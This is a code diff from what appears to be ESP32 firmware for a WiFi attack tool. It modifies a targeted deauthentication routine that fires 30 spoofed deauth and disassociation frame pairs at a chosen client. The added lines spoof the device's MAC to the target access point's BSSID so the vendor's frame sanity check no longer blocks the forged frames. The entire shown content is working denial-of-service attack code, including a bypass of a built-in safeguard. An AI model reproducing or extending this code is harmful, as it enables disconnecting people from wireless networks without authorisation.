@@ -78,19 +78,27 @@ static void client_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 }
 
 /* Targeted deauth: AP → STA (client), spoofed sender = AP.
- * Fires 30 deauth+disassoc pairs = 60 frames at ~5ms spacing. */
+ * Fires 30 deauth+disassoc pairs = 60 frames at ~5ms spacing.
+ *
+ * Spoofs STA MAC to target BSSID before TX so the stock ESP-IDF blob
+ * doesn't drop every frame at ieee80211_raw_frame_sanity_check. */
 static void deauth_client(const uint8_t *client)
 {
     static uint16_t seq = 0;
     if (seq == 0) seq = (uint16_t)(esp_random() & 0x0FFF);
-    /* Ensure we're on the right channel — wifi_clients keeps us locked
-     * to s_target_ch, but re-apply defensively in case another feature
-     * leaked a channel change via the hopper. */
+
+    uint8_t saved_mac[6];
+    wifi_save_sta_mac(saved_mac);
+    esp_err_t mac_rc = wifi_spoof_sta_mac(s_target);
+    Serial.printf("[clients] set_mac -> BSSID rc=%d\n", (int)mac_rc);
+
     esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < 30; ++i) {
         wifi_deauth_pair(client, s_target, &seq);
         delay(5);
     }
+
+    wifi_spoof_sta_mac(saved_mac);
 }
 
 void feat_wifi_clients(void)
